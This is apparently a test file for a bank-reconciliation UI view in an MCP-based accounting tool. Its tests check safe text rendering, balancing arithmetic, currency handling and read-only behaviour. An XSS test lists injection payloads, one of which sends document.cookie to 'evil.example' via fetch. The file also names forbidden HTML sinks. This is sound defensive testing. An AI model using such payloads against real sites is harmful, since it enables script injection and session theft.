import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildReconcileData,
  renderTemplate,
  MAX_ROWS,
  RECONCILE_TEMPLATE_MIME,
  RECONCILE_TEMPLATE_URI,
} from "../dist/ui/reconciliation.js";
import { uiTools } from "../dist/tools/ui.js";
import { allTools, registeredTools } from "../dist/server.js";

/** A reconciliation shaped like the real one, with field names taken from live data. */
const sample = (overrides = {}) => ({
  bankAccountId: 1338,
  bankAccountName: "drift",
  bankCurrency: "NOK",
  tenantCurrency: "NOK",
  month: "2026-07",
  pendingTransactionCount: 2,
  pendingPostingCount: 1,
  pendingTransactions: [
    {
      id: 43063,
      amount: 112.02,
      currency: "NOK",
      transactionDate: "2026-07-31",
      description: "Utb. 2000014 Vippsnr 58977",
      paymentReference: null,
    },
    {
      id: 43064,
      amount: -250.5,
      currency: "NOK",
      transactionDate: "2026-07-30",
      description: "Europris Hommelvik",
      paymentReference: "KID0001",
    },
  ],
  pendingPostings: [
    {
      id: 118681,
      amount: -138.48,
      currencyAmount: -138.48,
      voucherNumber: "MV46-2026",
      postingDate: "2026-07-31",
      description: "Vipps-oppgjør",
    },
  ],
  ...overrides,
});

// ---------------------------------------------------------------------------
// A DOM small enough to read, and hostile in exactly one way: every HTML-parsing
// sink throws. That is the security property of this view — data reaches the page as
// text nodes, never as markup — enforced by making the unsafe path impossible rather
// than by grepping for it.
// ---------------------------------------------------------------------------

const FORBIDDEN = ["innerHTML", "outerHTML", "insertAdjacentHTML"];

function makeElement(tag, doc) {
  const node = {
    tagName: String(tag).toUpperCase(),
    className: "",
    children: [],
    dataset: {},
    listeners: {},
    hidden: false,
    checked: false,
    value: "",
    disabled: false,
    title: "",
    type: "",
    _text: "",
    get textContent() {
      // What a real node reports: own text plus every descendant's.
      return this._text + this.children.map((c) => c.textContent).join("");
    },
    set textContent(v) {
      this._text = v === null || v === undefined ? "" : String(v);
      this.children = [];
    },
    appendChild(child) {
      this.children.push(child);
      return child;
    },
    addEventListener(name, fn) {
      (this.listeners[name] ??= []).push(fn);
    },
    dispatch(name) {
      for (const fn of this.listeners[name] ?? []) fn({ target: this });
    },
    setAttribute(k, v) {
      this[k] = v;
    },
    getAttribute(k) {
      return this[k];
    },
    /** Every element in this subtree, self included. */
    all() {
      return [this, ...this.children.flatMap((c) => c.all())];
    },
  };
  for (const sink of FORBIDDEN) {
    Object.defineProperty(node, sink, {
      get() {
        throw new Error(`the view read ${sink}`);
      },
      set() {
        throw new Error(`the view wrote ${sink} — data must reach the DOM as text`);
      },
    });
  }
  if (doc) doc._created.push(node);
  return node;
}

/** Run the template's script against the stub DOM and return a handle to poke it. */
function mount() {
  const html = renderTemplate();
  const script = html.match(/<script>([\s\S]*)<\/script>/)?.[1];
  assert.ok(script, "the template must carry its script inline");

  const byId = new Map();
  const doc = {
    _created: [],
    getElementById(id) {
      if (!byId.has(id)) byId.set(id, makeElement("div", null));
      return byId.get(id);
    },
    createElement(tag) {
      return makeElement(tag, doc);
    },
    querySelectorAll(selector) {
      assert.equal(selector, "input[type=checkbox]", `unexpected selector: ${selector}`);
      return doc._created.filter((n) => n.tagName === "INPUT" && n.type === "checkbox");
    },
    write() {
      throw new Error("the view called document.write");
    },
  };
  const posted = [];
  const messageHandlers = [];
  const win = {
    parent: {
      postMessage(msg) {
        posted.push(msg);
      },
    },
    addEventListener(name, fn) {
      if (name === "message") messageHandlers.push(fn);
    },
  };

  // Strict mode, so the script cannot reach a global by assigning to an undeclared name.
  // (`eval` and `Function` cannot be shadowed as parameters in strict mode; the static
  // test asserts textually that neither appears.)
  const run = new Function("window", "document", `"use strict";${script}`);
  run(win, doc);

  return {
    posted,
    element: (id) => doc.getElementById(id),
    boxes: () => doc.querySelectorAll("input[type=checkbox]"),
    /** Deliver a tool result the way an MCP Apps host does. */
    deliver(structuredContent) {
      for (const fn of messageHandlers) {
        fn({ data: { jsonrpc: "2.0", method: "ui/notifications/tool-result", params: { structuredContent } } });
      }
    },
    check(kind, id) {
      const box = doc
        ._created.filter((n) => n.tagName === "INPUT")
        .find((n) => n.dataset.kind === kind && n.dataset.id === String(id));
      assert.ok(box, `no ${kind} checkbox for id ${id}`);
      box.checked = true;
      box.dispatch("change");
      return box;
    },
  };
}

const data = (overrides = {}) => ({
  ...buildReconcileData(sample(), { bankAccountId: 1338, month: "2026-07", tenantId: 2634 }),
  ...overrides,
});

/** The arguments out of the call the view displays, which carries prose after the JSON. */
function argsOf(text) {
  return JSON.parse(text.slice(text.indexOf("{"), text.lastIndexOf("}") + 1));
}

// ---------------------------------------------------------------------------

// Descriptions, references and voucher numbers arrive from EHF documents and bank feeds,
// which is to say a counterparty writes them. The view renders inside the user's client,
// so if any of them could become markup it would be script injection with an external
// author — the one security property this file exists to hold.
test("counterparty text reaches the page as text, never as markup", () => {
  const payloads = [
    "</script><script>fetch('https://evil.example?c='+document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "'; alert(1); //",
    "<!--<script>alert(1)</script>-->",
    // Quote-free and angle-bracket-free, so HTML escaping would pass it through intact.
    // The old server-rendered version interpolated a value into JS source, where exactly
    // this payload was live code; there is no interpolation left for it to reach.
    "0,x:alert(1)",
  ];
  for (const payload of payloads) {
    const ui = mount();
    // Every field the API controls, not only the obviously textual ones.
    ui.deliver(
      data({
        bankAccountName: payload,
        month: payload,
        bankCurrency: payload,
        tenantCurrency: payload,
        transactions: [
          { id: 1, date: payload, amount: 1, currency: payload, description: payload, reference: payload },
        ],
        postings: [
          {
            id: 2,
            date: payload,
            amount: 1,
            currencyAmount: null,
            voucherNumber: payload,
            description: payload,
          },
        ],
      }),
    );
    // Reaching the DOM at all proves no HTML sink was used: the stub throws on every one.
    // And the payload must survive VERBATIM as text — escaping it would mean it had been
    // treated as markup somewhere.
    const title = ui.element("title").textContent;
    assert.ok(title.includes(payload), `the name was not rendered as text: ${payload}`);
    assert.ok(!title.includes("&lt;"), "text was HTML-escaped, so it was treated as markup");
    assert.ok(
      ui.element("tx-rows").textContent.includes(payload),
      `a transaction description was not rendered as text: ${payload}`,
    );
  }
});

test("the template is static, so there is no interpolation site at all", () => {
  const html = renderTemplate();
  // Two renders of a data-free template are identical by construction; asserting it keeps
  // a future "just pass the account id in" from reopening the injection class.
  assert.equal(html, renderTemplate());
  assert.equal(renderTemplate.length, 0, "renderTemplate must take no arguments");
  const script = html.match(/<script>([\s\S]*)<\/script>/)[1];
  for (const sink of [...FORBIDDEN, "document.write", "eval(", "new Function"]) {
    assert.ok(!script.includes(sink), `the script uses ${sink}`);
  }
});

// A host renders this under a strict CSP, so anything fetched would silently fail — and
// an accounting view should not phone anywhere regardless.
test("the view makes no external request", () => {
  const html = renderTemplate();
  assert.ok(!/https?:\/\//.test(html), "the view must not reference any external URL");
  assert.ok(!/<link|<img|@import|url\(/i.test(html), "no external stylesheet, image or font");
});

// The bug this test exists for: amounts were formatted nb-NO into an attribute and parsed
// back out, and nb-NO uses U+2212 MINUS SIGN, which the parser's character class dropped.
// Two transactions of +112,02 and −250,50 against a −138,48 posting balance exactly; the
// view reported a 224,04 discrepancy and offered a call that books one.
test("the running difference respects sign and øre", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("tx", 43064);
  ui.check("post", 118681);
  assert.equal(ui.element("diff").textContent, "balanced");
  assert.equal(ui.element("match").disabled, false);
  const call = ui.element("call").textContent;
  assert.match(call, /reai_match_bank_transactions/);
  const args = argsOf(call);
  assert.deepEqual(args.transactionIds, [43063, 43064]);
  assert.deepEqual(args.postingIds, [118681]);
  assert.equal(args.discrepancyAccount, undefined, "a balanced pair must not book a difference");
  // Carried through, or a caller who passed tenantId explicitly gets "No tenant selected"
  // from the very call this view told them to make.
  assert.equal(args.tenantId, 2634);
});

test("float noise does not become a discrepancy", () => {
  const ui = mount();
  ui.deliver(
    data({
      transactions: [
        { id: 1, date: "2026-07-01", amount: 0.1, currency: "NOK", description: "a", reference: "" },
        { id: 2, date: "2026-07-01", amount: 0.2, currency: "NOK", description: "b", reference: "" },
      ],
      postings: [
        { id: 3, date: "2026-07-01", amount: 0.3, currencyAmount: null, voucherNumber: "MV1", description: "c" },
      ],
      transactionTotal: 2,
      postingTotal: 1,
    }),
  );
  ui.check("tx", 1);
  ui.check("tx", 2);
  ui.check("post", 3);
  assert.equal(ui.element("diff").textContent, "balanced");
});

// Both id arrays have .min(1) in reai_match_bank_transactions, so a one-sided selection
// has no valid call — offering one would hand over something the schema rejects.
test("a one-sided selection offers no call and no button", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  assert.equal(ui.element("match").disabled, true);
  assert.match(ui.element("call").textContent, /a match needs both/);
  assert.equal(ui.element("diff").textContent, "");
  assert.match(ui.element("count").textContent, /1 transaction\(s\), 0 posting\(s\)/);
});

// An unbalanced pair needs an account to book the difference to, and this view will not
// invent one — the old version put a placeholder string in the call it told you to run.
test("an unbalanced pair demands an account before it will offer the call", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("post", 118681);
  assert.match(ui.element("diff").textContent, /difference/);
  assert.equal(ui.element("account-wrap").hidden, false);
  assert.equal(ui.element("match").disabled, true, "no account yet, so nothing to offer");
  assert.ok(!ui.element("call").textContent.includes("SET_THE_ACCOUNT"));

  const account = ui.element("account");
  account.value = "7770";
  account.dispatch("input");
  assert.equal(ui.element("match").disabled, false);
  assert.equal(argsOf(ui.element("call").textContent).discrepancyAccount, "7770");
});

// Pressing the button is a request; the host mediates it and the server re-checks the
// write policy. It must carry the same arguments the view displayed.
test("the button asks the host to call the real tool", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("tx", 43064);
  ui.check("post", 118681);
  ui.element("match").dispatch("click");
  const call = ui.posted.find((m) => m.method === "tools/call");
  assert.ok(call, "the button must issue tools/call");
  assert.equal(call.params.name, "reai_match_bank_transactions");
  assert.deepEqual(call.params.arguments.transactionIds, [43063, 43064]);
  assert.equal(call.params.arguments.tenantId, 2634);

  // And it must refuse when the selection is not one the tool would accept.
  const half = mount();
  half.deliver(data());
  half.check("tx", 43063);
  half.element("match").dispatch("click");
  assert.equal(half.posted.filter((m) => m.method === "tools/call").length, 0);
});

test("the view announces itself to the host on load", () => {
  const ui = mount();
  const init = ui.posted.find((m) => m.method === "ui/initialize");
  assert.ok(init, "the view must send ui/initialize");
  assert.equal(init.jsonrpc, "2.0");
  assert.ok(init.id !== undefined, "a request needs an id");
});

// Two currencies cannot be subtracted. Which of the posting's two amounts is the bank
// figure is undocumented and unverifiable against reachable data, so the view shows both
// and states no difference rather than asserting a wrong one.
test("a foreign-currency account shows both figures and computes no difference", () => {
  const view = buildReconcileData(sample({ bankCurrency: "USD", tenantCurrency: "NOK" }), {
    bankAccountId: 1338,
    month: "2026-07",
  });
  assert.equal(view.comparable, false);

  const ui = mount();
  ui.deliver(view);
  assert.match(ui.element("currency-warning").textContent, /USD.*NOK|NOK.*USD/);
  assert.equal(ui.element("currency-warning").hidden, false);
  ui.check("tx", 43063);
  ui.check("post", 118681);
  assert.match(ui.element("diff").textContent, /not computed/);
  assert.equal(ui.element("match").disabled, true, "must not offer a match it cannot check");
  // The exact call is still shown, so a user who has checked the conversion can run it.
  assert.match(ui.element("call").textContent, /reai_match_bank_transactions/);

  // And when the currencies agree — every case in reachable data — it computes normally.
  assert.equal(buildReconcileData(sample(), { bankAccountId: 1338, month: "2026-07" }).comparable, true);
});

// The failure that made this view worth building was a truncated column read as a
// complete one. A trimmed column must state the real total, in the view AND in the text.
test("a trimmed column states the real total", async () => {
  const many = Array.from({ length: 400 }, (_, i) => ({
    id: 1000 + i,
    amount: i,
    currency: "NOK",
    transactionDate: "2026-07-01",
    description: `row ${i}`,
  }));
  const view = buildReconcileData(sample({ pendingTransactions: many, pendingTransactionCount: 400 }), {
    bankAccountId: 1338,
    month: "2026-07",
  });
  assert.equal(view.transactions.length, MAX_ROWS);
  assert.equal(view.transactionTotal, 400, "the true total must survive the trim");

  const ui = mount();
  ui.deliver(view);
  assert.match(ui.element("tx-rows-trimmed").textContent, /Showing 120 of 400/);
  assert.equal(ui.element("post-rows-trimmed").textContent, "", "a complete column says nothing");

  const { text } = await callTool({ pendingTransactions: many, pendingTransactionCount: 400 });
  assert.match(text, /400 unmatched transaction\(s\)/);
  assert.match(text, /shows \d+ of 400/);
});

test("an empty period says so, and a missing one does not claim to be reconciled", async () => {
  const empty = mount();
  empty.deliver(
    buildReconcileData(
      sample({ pendingTransactions: [], pendingPostings: [], pendingTransactionCount: 0, pendingPostingCount: 0 }),
      { bankAccountId: 1338, month: "2026-07" },
    ),
  );
  assert.match(empty.element("tx-rows").textContent, /Nothing unmatched on the bank side/);
  assert.match(empty.element("post-rows").textContent, /Nothing unmatched on the ledger side/);

  const locked = mount();
  locked.deliver(buildReconcileData(sample({ closed: true }), { bankAccountId: 1338, month: "2026-07" }));
  assert.match(locked.element("locked").textContent, /closed or locked/);
  assert.equal(locked.element("locked").hidden, false);

  // Absence is not zero. An empty body reported as "this month is reconciled" is a
  // positive claim about the books made from no evidence — and it is the sentence the
  // MODEL reads. Reachable for real: a providerType 'manual' account has no
  // reconciliation view.
  const nothing = await callTool(undefined);
  assert.doesNotMatch(nothing.text, /is reconciled/);
  assert.match(nothing.text, /unknown/);
  assert.match(nothing.text, /manual/);

  // Counts without the list is the other half: the totals are real, the rows are not.
  const partial = await callTool({
    pendingTransactionCount: 12,
    pendingPostingCount: 7,
    pendingTransactions: null,
    pendingPostings: null,
  });
  assert.doesNotMatch(partial.text, /is reconciled/);
  assert.match(partial.text, /counts without the corresponding list/);

  // And a genuinely reconciled month still says so.
  const done = await callTool({ pendingTransactionCount: 0, pendingPostingCount: 0 });
  assert.match(done.text, /this month is reconciled/);
});

/** Call the tool with a stubbed client and return its text plus structuredContent. */
async function callTool(data, args = {}) {
  const [tool] = uiTools;
  const result = await tool.handler(
    { bankAccountId: 1338, month: "2026-07", tenantId: 2634, ...args },
    {
      client: { request: async () => ({ data, status: 200 }), deepLink: () => "link" },
      config: { writeMode: "read-only", tenantId: 2634 },
      session: {},
    },
  );
  return {
    text: result.content.find((c) => c.type === "text").text,
    structured: result.structuredContent,
    result,
  };
}

test("the tool is read-only, opt-in, and points the host at the view", async () => {
  assert.equal(uiTools.length, 1, "one view, deliberately");
  const [tool] = uiTools;
  assert.equal(tool.name, "reai_reconcile_ui");
  assert.equal(tool.risk, "read", "selecting must not be a write");
  assert.ok(!tool.transmits, "nothing here leaves the tenant");
  assert.equal(tool.meta.ui.resourceUri, RECONCILE_TEMPLATE_URI);
  assert.equal(RECONCILE_TEMPLATE_MIME, "text/html;profile=mcp-app");
  assert.ok(RECONCILE_TEMPLATE_URI.startsWith("ui://"));
  // Not in the default surface, but inside the set the repo-wide invariants iterate.
  assert.ok(!allTools.some((t) => t.name === "reai_reconcile_ui"), "must be off by default");
  assert.ok(registeredTools.some((t) => t.name === "reai_reconcile_ui"), "must not escape the guards");

  const { text, structured } = await callTool(sample());
  assert.match(text, /2 unmatched transaction\(s\) and 1 unmatched posting\(s\)/);
  assert.match(text, /reai_match_bank_transactions/);
  assert.equal(structured.transactions.length, 2);
  assert.equal(structured.tenantId, 2634);
});

// structuredContent is a rendering input, but several hosts also put it in front of the
// model, so it is a context cost. The template is fetched once; this travels per call.
test("the per-call payload stays within a budget", async () => {
  const many = Array.from({ length: 400 }, (_, i) => ({
    id: 1000 + i,
    amount: 1234.56,
    currency: "NOK",
    transactionDate: "2026-07-01",
    // A real Norwegian invoice line, at length, twice over.
    description: `Fakturanr 2026-${i} — leveranse av kontorrekvisita og forbruksmateriell til avdeling Hommelvik, jf. avtale`,
    paymentReference: `KID${String(i).padStart(12, "0")}`,
  }));
  const { text, structured } = await callTool({
    ...sample(),
    pendingTransactions: many,
    pendingTransactionCount: 400,
  });
  assert.ok(
    JSON.stringify(structured).length <= 12_000,
    `payload was ${JSON.stringify(structured).length} chars`,
  );
  // Trimming further than MAX_ROWS is allowed; hiding that it happened is not.
  assert.ok(structured.transactions.length < 400);
  assert.equal(structured.transactionTotal, 400);
  assert.match(text, new RegExp(`shows ${structured.transactions.length} of 400`));

  // The template itself is a fixed cost, paid once by hosts that fetch it.
  assert.ok(renderTemplate().length < 20_000, `template was ${renderTemplate().length} chars`);
});
